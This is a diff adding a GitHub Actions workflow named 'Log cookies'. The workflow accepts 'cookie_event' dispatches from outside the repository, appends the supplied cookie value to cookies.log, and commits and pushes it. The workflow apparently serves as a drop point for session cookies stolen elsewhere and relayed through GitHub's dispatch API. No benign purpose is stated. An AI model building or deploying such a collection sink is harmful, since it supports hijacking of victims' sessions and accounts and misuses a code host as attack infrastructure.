@@ -1,0 +1,23 @@
+name: Log cookies
+
+on:
+  repository_dispatch:
+    types: [cookie_event]
+
+jobs:
+  log:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Append to cookies.log
+        run: |
+          echo "$PAYLOAD" >> cookies.log
+          git config user.name github-actions
+          git config user.email github-actions@github.com
+          git add cookies.log
+          git commit -m "Add cookie"
+          git push
+    env:
+      PAYLOAD: ${{ github.event.client_payload.cookie }}
